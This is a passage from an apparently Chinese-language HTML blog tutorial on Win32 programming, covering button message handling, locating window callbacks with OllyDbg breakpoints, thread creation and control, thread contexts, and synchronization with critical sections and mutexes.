LR;按钮--单击按钮--&gt;Windows提供的WinProc函数Windows提供的WinProc函数--转化为WM_COMMAND--&gt;父窗口的WinProc</code></pre><p>一个典型的C语言子窗口事件处理逻辑如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">case</span> WM_COMMAND:<br>&#123;<br><span class="hljs-keyword">switch</span>(LOWORD(wParam))<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-number">1001</span>:<br>MessageBox(hwnd,<span class="hljs-string">&quot;Hello Button 1&quot;</span>,<span class="hljs-string">&quot;Demo&quot;</span>,MB_OK);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">1002</span>:<br>MessageBox(hwnd,<span class="hljs-string">&quot;Hello Button 2&quot;</span>,<span class="hljs-string">&quot;Demo&quot;</span>,MB_OK);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">1003</span>:<br>MessageBox(hwnd,<span class="hljs-string">&quot;Hello Button 3&quot;</span>,<span class="hljs-string">&quot;Demo&quot;</span>,MB_OK);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">return</span> DefWindowProc(hwnd,uMsg,wParam,lParam);<br>&#125;<br></code></pre></td></tr></table></figure><p>其中1001-1003是调用创建窗口函数时传入的菜单句柄参数。由上我们可以看到，在转成WM_COMMAND后的菜单句柄参数将放在wParam参数的低字中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">hwndPushButton = CreateWindow(<br>    TEXT(<span class="hljs-string">&quot;button&quot;</span>),<br>    TEXT(<span class="hljs-string">&quot;普通按钮&quot;</span>),<br>    <span class="hljs-comment">//WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON,            </span><br>    WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON,<br>    <span class="hljs-number">10</span>, <span class="hljs-number">10</span>,<br>    <span class="hljs-number">80</span>, <span class="hljs-number">20</span>,<br>    hwnd,<br>    (HMENU)<span class="hljs-number">1001</span>,    <span class="hljs-comment">//子窗口ID                        </span><br>    hAppInstance,<br>    <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure><p>所以在调试的时候，我们通过条件断点筛选出WM_COMMAND（0x111）再进行处理即可。</p><h2 id="复杂程序的回调函数的定位"><a href="#复杂程序的回调函数的定位" class="headerlink" title="复杂程序的回调函数的定位"></a>复杂程序的回调函数的定位</h2><p>当我们要逆向的程序十分复杂，可能无法直接找到消息处理函数的时候，需要通过间接的方式帮助我们找到消息断点。</p><p>在Ollydbg的Windows窗口中，可以看到我们需要跟踪的窗口，在上面下消息断点即可。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image-20211230152447454.png" alt="image-20211230152447454"></p><p>Button在之前介绍过是先调用系统的消息处理函数再转换成WM_COMMAND消息传递给开发者自己编写的消息处理函数。</p><p>于是乎，我们可以在用户代码段下一个内存访问断点，当操作系统调用自定义的消息处理函数时就会触发。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image-20211230152804049.png" alt="image-20211230152804049"></p><p>这里注意有很多个.text段，需要找到自己的PE文件对应的.text段</p><p>设置内存访问断点后F9运行，就会断到用用户空间的消息处理函数。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image-20211230153025831.png" alt="image-20211230153025831"></p><p>这里需要同样注意的是，当我们点击按钮时可能不止产生一种消息，我们还需要通过消息堆栈中的消息类型来判断是否是我们关注的消息类型。在这里我们需要关注的是WM_COMMAND（0x111）。而最初的消息是0x135：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image-20211230153449710.png" alt="image-20211230153449710"></p><p>这个时候虽然不是我们关注的消息类型，但是我们已经找到了消息处理函数的位置了。我们可将内存访问断点取消并用消息处理函数的第一行代码上下断点代替，之后再次F9运行代码，这里得到的就是我们关注的0x111消息了，之后继续跟进即可。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image-20211230153810345.png" alt="image-20211230153810345"></p><h1 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h1><h2 id="线程创建"><a href="#线程创建" class="headerlink" title="线程创建"></a>线程创建</h2><p>举例说明之，在Win32程序中，如果有循环或者其他占用时间较长的代码，主线程的消息处理函数将无法得到正常执行。这个时候需要引入新的线程来完成业务逻辑。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">HANDLE <span class="hljs-title function_">CreateThread</span><span class="hljs-params">(<span class="hljs-comment">// 返回值：线程句柄</span></span><br><span class="hljs-params">LPSECURITY_ATTRIBUTES lpThreadAttributes,<span class="hljs-comment">// 安全属性 通常为NULL</span></span><br><span class="hljs-params">SIZE_T dwStackSize,<span class="hljs-comment">// 参数用于设定线程可以将多少地址空间用于它自己的堆栈</span></span><br><span class="hljs-params"><span class="hljs-comment">// 每个线程拥有它自己的堆栈</span></span><br><span class="hljs-params">LPTHREAD_START_ROUTINE lpStartAddress,<span class="hljs-comment">// 参数用于指明想要新线程执行的线程函数的地址</span></span><br><span class="hljs-params">LPVOID lpParameter,<span class="hljs-comment">// 线程函数的参数</span></span><br><span class="hljs-params"><span class="hljs-comment">// 在线程启动执行时将该参数传递给线程函数</span></span><br><span class="hljs-params"><span class="hljs-comment">// 既可以是数字，也可以是指向包含其他信息的一个数据结构的指针</span></span><br><span class="hljs-params">DWORD dwCreationFlags,<span class="hljs-comment">// 0 创建完毕立即调度  CREATE_SUSPENDED创建后挂起</span></span><br><span class="hljs-params">LPDWORD lpThreadId<span class="hljs-comment">// 线程ID </span></span><br><span class="hljs-params">)</span>;<br><br></code></pre></td></tr></table></figure><h3 id="创建线程时提供参数"><a href="#创建线程时提供参数" class="headerlink" title="创建线程时提供参数"></a>创建线程时提供参数</h3><p>向线程传递参数，如下图所示，我们想要自定义线程执行for循环的次数，将n传递进去，这时候需要注意参数传递到线程参数时在堆栈中存在，并且传递的时候需要强制转换一下：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-22_2-12-19.png" alt="images/download/attachments/12714992/image2021-5-22_2-12-19.png"></p><p>这里有一个坑点是需要考虑参数的生命周期问题，如MyTest()这样的函数在执行完后会销毁堆栈，亦即清空其中的局部变量，当新的线程尝试引用这些变量时将发生错误。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image-20220119125748588.png" alt="image-20220119125748588"></p><p>解决方法之一是将参数放在全局变量区：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image-20220119125807272.png" alt="image-20220119125807272"></p><h2 id="线程控制"><a href="#线程控制" class="headerlink" title="线程控制"></a>线程控制</h2><h4 id="Sleep"><a href="#Sleep" class="headerlink" title="Sleep"></a>Sleep</h4><p>Sleep函数是让当前执行到本函数时延迟指定的毫秒之后再向下走，例如：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">for</span>(int i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) &#123;<br>    <span class="hljs-built_in">Sleep</span>(<span class="hljs-number">500</span>);<br>    <span class="hljs-built_in">printf</span>(&quot;------ %d \n&quot;, i);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="线程挂起与恢复"><a href="#线程挂起与恢复" class="headerlink" title="线程挂起与恢复"></a>线程挂起与恢复</h4><p><strong>SuspendThread</strong></p><p>SuspendThread函数用于暂停（挂起）某个线程，当暂停后该线程不会占用CPU，其语法格式很简单，只需要传入一个线程句柄即可：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function">DWORD <span class="hljs-title">SuspendThread</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  HANDLE hThread   <span class="hljs-comment">// handle to thread</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p><strong>ResumeThread</strong></p><p>ResumeThread函数用于恢复被暂停（挂起）的线程，其语法格式也很简单，只需要传入一个线程句柄即可：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function">DWORD <span class="hljs-title">ResumeThread</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  HANDLE hThread   <span class="hljs-comment">// handle to thread</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>需要注意的是，挂起几次就要恢复几次。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">SuspendThread(<span class="hljs-params">hThread</span>)</span>;<br><span class="hljs-constructor">SuspendThread(<span class="hljs-params">hThread</span>)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">ResumeThread(<span class="hljs-params">hThread</span>)</span>;<br><span class="hljs-constructor">ResumeThread(<span class="hljs-params">hThread</span>)</span>;<br></code></pre></td></tr></table></figure><h4 id="线程终止"><a href="#线程终止" class="headerlink" title="线程终止"></a>线程终止</h4><p>线程终止有如下三种方式</p><p>①</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">::ExitThread(DWORD dwExitCode);<br></code></pre></td></tr></table></figure><p>②线程函数返回</p><p>③</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">::TerminateThread(hThread,<span class="hljs-number">2</span>);<br>::WaitForSingleObject(hThread,INFINITE);<br></code></pre></td></tr></table></figure><p>①和③方式的区别就是①是同步的，③是异步的。</p><h4 id="GetExitCodeThread"><a href="#GetExitCodeThread" class="headerlink" title="GetExitCodeThread"></a>GetExitCodeThread</h4><p>线程函数会有一个返回值（DWORD），这个返回值可以根据你的需求进行返回，而我们需要如何获取这个返回结果呢？这时候就可以使用<strong>GetExitCodeThread</strong>函数，其语法格式如下：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function">BOOL <span class="hljs-title">GetExitCodeThread</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  HANDLE hThread,      <span class="hljs-comment">// handle to the thread</span></span></span><br><span class="hljs-params"><span class="hljs-function">  LPDWORD lpExitCode   <span class="hljs-comment">// termination status</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-23_15-37-48.png" alt="images/download/attachments/12714992/image2021-5-23_15-37-48.png"></p><p>根据MSDN Library我们可以知道该函数的参数分别是线程句柄，而另一个则是out类型参数，这种类型则可以理解为GetExitCodeThread函数的返回结果。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">HANDLE hThread;<br>hThread = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, ThreadProc, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>WaitForSingleObject(hThread, INFINITE);<br>DWORD exitCode;<br>GetExitCodeThread(hThread, &amp;exitCode);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Exit Code: %d \n&quot;</span>, exitCode);<br></code></pre></td></tr></table></figure><p>若ExitCode为STILL_ACTIVE，则表示该线程正在运行。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-23_15-44-6.png" alt="images/download/attachments/12714992/image2021-5-23_15-44-6.png"></p><p>需要注意的是这个函数应该搭配着如上所学的2个等待函数一起使用，不然获取到的值就不会是线程函数返回的值。</p><h2 id="设置、获取线程上下文"><a href="#设置、获取线程上下文" class="headerlink" title="设置、获取线程上下文"></a>设置、获取线程上下文</h2><p><strong>线程上下文</strong>是指某一时间点CPU寄存器和程序计数器的内容，如果想要设置、获取线程上下文就需要先将线程<strong>挂起</strong>。</p><h3 id="GetThreadContext函数"><a href="#GetThreadContext函数" class="headerlink" title="GetThreadContext函数"></a>GetThreadContext函数</h3><p>GetThreadContext函数用于获取线程上下文，其语法格式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">GetThreadContext</span><span class="hljs-params">(</span><br><span class="hljs-params">  HANDLE hThread,       <span class="hljs-comment">// handle to thread with context 句柄</span></span><br><span class="hljs-params">  LPCONTEXT lpContext   <span class="hljs-comment">// context structure</span></span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-23_15-52-19.png" alt="images/download/attachments/12714992/image2021-5-23_15-52-19.png"></p><p>第一个参数就是线程句柄，这个很好理解，重点是第二个参数，其是一个CONTEXT结构体，该结构体包含指定线程的上下文，其ContextFlags成员的值指定了要设置线程上下文的哪些部分。</p><p>当我们将CONTEXT结构体的ContextFlags成员的值设置为CONTEXT_INTEGER时则可以获取edi、esi、ebx、edx、ecx、eax这些寄存器的值：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-23_16-1-25.png" alt="images/download/attachments/12714992/image2021-5-23_16-1-25.png"></p><p>如下代码尝试获取：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">HANDLE hThread;<br>hThread = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, ThreadProc, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>SuspendThread(hThread);<br>CONTEXT c;<br>c.ContextFlags = CONTEXT_INTEGER;<br>GetThreadContext(hThread, &amp;c);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x %x \n&quot;</span>, c.Eax, c.Ecx);<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-23_16-1-50.png" alt="images/download/attachments/12714992/image2021-5-23_16-1-50.png"></p><h3 id="SetThreadContext函数"><a href="#SetThreadContext函数" class="headerlink" title="SetThreadContext函数"></a>SetThreadContext函数</h3><p>GetThreadContext函数是个设置修改线程上下文，其语法格式如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">BOOL SetThreadContext(<br>  HANDLE hThread,            <span class="hljs-regexp">//</span> handle to thread<br>  CONST CONTEXT *lpContext   <span class="hljs-regexp">//</span> context structure<br>);<br></code></pre></td></tr></table></figure><p>我们可以尝试修改Eax，然后再获取：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">HANDLE hThread;<br>hThread = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, ThreadProc, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>SuspendThread(hThread);<br>CONTEXT c;<br>c.ContextFlags = CONTEXT_INTEGER;<br>c.Eax = <span class="hljs-number">0x123</span>;<br>SetThreadContext(hThread, &amp;c);<br>CONTEXT c1;<br>c1.ContextFlags = CONTEXT_INTEGER;<br>GetThreadContext(hThread, &amp;c1);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x \n&quot;</span>, c1.Eax);<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-23_16-9-51.png" alt="images/download/attachments/12714992/image2021-5-23_16-9-51.png"></p><h2 id="线程互斥与线程同步"><a href="#线程互斥与线程同步" class="headerlink" title="线程互斥与线程同步"></a>线程互斥与线程同步</h2><h3 id="几种相关的结构"><a href="#几种相关的结构" class="headerlink" title="几种相关的结构"></a>几种相关的结构</h3><h4 id="临界区"><a href="#临界区" class="headerlink" title="临界区"></a>临界区</h4><h5 id="临界区的实现"><a href="#临界区的实现" class="headerlink" title="临界区的实现"></a>临界区的实现</h5><p>首先会有一个令牌，假设线程1获取了这个令牌，那么这时候令牌则只为线程1所有，然后线程1会执行代码去访问全局变量，最后归还令牌；<strong>如果其他线程想要去访问这个全局变量就需要获取这个令牌，但当令牌已经被取走时则无法访问</strong>。</p><p>假设你自己来实现临界区，可能在判断令牌有没有被拿走的时候就又会出现问题，所以自己实现临界区还是有一定的门槛的。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-27_15-24-36.png" alt="images/download/attachments/12714992/image2021-5-27_15-24-36.png"></p><h5 id="线程锁"><a href="#线程锁" class="headerlink" title="线程锁"></a>线程锁</h5><p>线程锁就是临界区的实现方式，通过线程锁我们可以完美解决如上所述的问题，其步骤如下所示：</p><ol><li>创建全局变量：CRITICAL_SECTION cs;</li><li>初始化全局变量：InitializeCriticalSection(&amp;cs);</li><li>实现临界区：进入 → EnterCriticalSection(&amp;cs); 离开 → LeaveCriticalSection(&amp;cs);</li></ol><h5 id="临界区使用"><a href="#临界区使用" class="headerlink" title="临界区使用"></a>临界区使用</h5><p>我们就可以这样改写之前的售卖物品的代码：</p><p>在使用全局变量开始前构建并进入临界区，使用完之后离开临界区：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><br>CRITICAL_SECTION cs; <span class="hljs-comment">// 创建全局变量</span><br><span class="hljs-type">int</span> countNumber = <span class="hljs-number">10</span>;<br><br>DWORD WINAPI <span class="hljs-title function_">ThreadProc</span><span class="hljs-params">(LPVOID lpParameter)</span> &#123;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        EnterCriticalSection(&amp;cs); <span class="hljs-comment">// 构建临界区，获取令牌</span><br>        <span class="hljs-keyword">if</span> (countNumber &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Thread: %d\n&quot;</span>, *((<span class="hljs-type">int</span>*)lpParameter));<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sell num: %d\n&quot;</span>, countNumber);<br>            <span class="hljs-comment">// 售出-1</span><br>            countNumber--;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Count: %d\n&quot;</span>, countNumber);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            LeaveCriticalSection(&amp;cs); <span class="hljs-comment">// 离开临临界区，归还令牌</span><br>            <span class="hljs-keyword">break</span>;  <br>        &#125;<br>        LeaveCriticalSection(&amp;cs); <span class="hljs-comment">// 离开临临界区，归还令牌</span><br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span><br>&#123;<br><br>    InitializeCriticalSection(&amp;cs); <span class="hljs-comment">// 使用之前进行初始化</span><br>    <br>    <span class="hljs-type">int</span> a = <span class="hljs-number">1</span>;<br>    HANDLE hThread;<br>    hThread = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, ThreadProc, (LPVOID)&amp;a, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    <br>    <span class="hljs-type">int</span> b = <span class="hljs-number">2</span>;<br>    HANDLE hThread1;<br>    hThread1 = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, ThreadProc, (LPVOID)&amp;b, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><br>    CloseHandle(hThread);<br><br>    getchar();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-27_15-54-0.png" alt="images/download/attachments/12714992/image2021-5-27_15-54-0.png"></p><h4 id="互斥体"><a href="#互斥体" class="headerlink" title="互斥体"></a>互斥体</h4><p>我们了解了使用线程锁来解决多个线程共用一个全局变量的线程安全问题；<strong>那么假设A进程的B线程和C进程的D线程</strong>，同时使用的是内核级的临界资源（<strong>内核对象：线程、文件、进程…<strong>）该怎么让这个访问是安全的？</strong>使用线程锁的方式明显不行，因为线程锁仅能控制同进程中的多线程</strong>。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-27_16-8-12.png" alt="images/download/attachments/12714992/image2021-5-27_16-8-12.png"></p><p>那么这时候我们就需要一个<strong>能够放在内核中的令牌</strong>来控制，而实现这个作用的，我们称之为<strong>互斥体</strong>。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-27_16-10-43.png" alt="images/download/attachments/12714992/image2021-5-27_16-10-43.png"></p><h5 id="互斥体的使用"><a href="#互斥体的使用" class="headerlink" title="互斥体的使用"></a>互斥体的使用</h5><p>创建互斥体的函数为<strong>CreateMutex</strong>，该函数的语法格式如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">HANDLE CreateMutex(<br>  LPSECURITY_ATTRIBUTES lpMutexAttributes,  <span class="hljs-regexp">//</span> SD 安全属性，包含安全描述符<br>  BOOL bInitialOwner,                       <span class="hljs-regexp">//</span> initial owner 是否希望互斥体创建出来就有信号，或者说就可以使用，如果希望的话就为FALSE；官方解释为如果该值为TRUE则表示当前进程拥有该互斥体所有权<br>  LPCTSTR lpName                            <span class="hljs-regexp">//</span> object name 互斥体的名字<br>);<br></code></pre></td></tr></table></figure><p>我们可以模拟一下操作资源然后创建：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span><br>&#123;<br>    <span class="hljs-comment">// 创建互斥体</span><br>    HANDLE cm = CreateMutex(<span class="hljs-literal">NULL</span>, FALSE, <span class="hljs-string">&quot;XYZ&quot;</span>);<br>    <span class="hljs-comment">// 等待互斥体状态发生变化，也就是有信号或为互斥体拥有者，获取令牌</span><br>    WaitForSingleObject(cm, INFINITE);<br><br>    <span class="hljs-comment">// 操作资源</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Process: A Thread: B -- %d \n&quot;</span>, i);<br>        Sleep(<span class="hljs-number">1000</span>);<br>    &#125;<br>    <span class="hljs-comment">// 释放令牌</span><br>    ReleaseMutex(cm);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以运行两个进程来看一下互斥体的作用：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-27_16-57-41.png" alt="images/download/attachments/12714992/image2021-5-27_16-57-41.png"></p><p><strong>互斥体和线程锁的区别</strong></p><ol><li>线程锁只能用于单个进程间的线程控制</li><li>互斥体可以设定等待超时，但线程锁不能</li><li>线程意外结束时，互斥体可以避免无限等待</li><li>互斥体效率没有线程锁高</li></ol><h5 id="课外扩展-互斥体防止程序多开"><a href="#课外扩展-互斥体防止程序多开" class="headerlink" title="课外扩展-互斥体防止程序多开"></a>课外扩展-互斥体防止程序多开</h5><p>CreateMutex函数的返回值MSDN Library的介绍是这样的：<strong>如果函数成功，返回值是一个指向mutex对象的句柄；如果命名的mutex对象在函数调用前已经存在，函数返回现有对象的句柄，GetLastError返回ERROR_ALREADY_EXISTS（表示互斥体以及存在）；否则，调用者创建该mutex对象；如果函数失败，返回值为NULL，要获得扩展的错误信息，请调用GetLastError获取</strong>。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-27_16-53-41.png" alt="images/download/attachments/12714992/image2021-5-27_16-53-41.png"></p><p>所以我们可以利用互斥体来防止程序进行多开：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span><br>&#123;<br>    <span class="hljs-comment">// 创建互斥体</span><br>    HANDLE cm = 